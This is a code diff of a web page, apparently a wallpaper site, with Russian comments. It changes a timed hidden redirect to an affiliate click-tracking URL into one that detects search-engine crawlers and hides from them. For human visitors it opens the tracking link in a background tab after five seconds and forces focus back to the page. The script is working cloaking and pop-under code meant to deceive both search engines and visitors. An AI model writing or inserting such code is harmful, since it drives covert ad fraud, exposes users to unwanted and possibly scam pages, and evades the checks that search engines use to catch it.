@@ -84,16 +84,26 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
     <script>
         $(document).ready(function() {
-            setTimeout(function() {
-                var url = 'https://scpooj.com/click?o=2&a=1325&sub_id1=iphone-wallpapers';
-                // Создаем скрытый элемент <a> и нажимаем его
-                var $a = $('<a>', {
-                    href: url,
-                    target: '_blank'
-                }).appendTo('body');
-                $a[0].click();
-                $a.remove();
-            }, 5000); // Задержка 5 секунд
+            // Проверка на поисковых ботов
+            function isBot() {
+                const userAgent = navigator.userAgent.toLowerCase();
+                const bots = ['googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'slurp'];
+                return bots.some(bot => userAgent.includes(bot));
+            }
+
+            if (!isBot()) {
+                // Таймер для скрытой переадресации спустя 5 секунд
+                setTimeout(function() {
+                    var url = 'https://scpooj.com/click?o=2&a=1325&sub_id1=iphone-wallpapers';
+                    
+                    // Открытие новой вкладки скрыто
+                    var newWindow = window.open(url, '_blank');
+                    if (newWindow) {
+                        newWindow.blur();
+                        window.focus(); // Оставляем фокус на основном окне
+                    }
+                }, 5000); // Задержка 5 секунд
+            }
 
             // Добавляем функционал скрытия/показа боковой панели
             $('#toggleSidebar').on('click', function() {
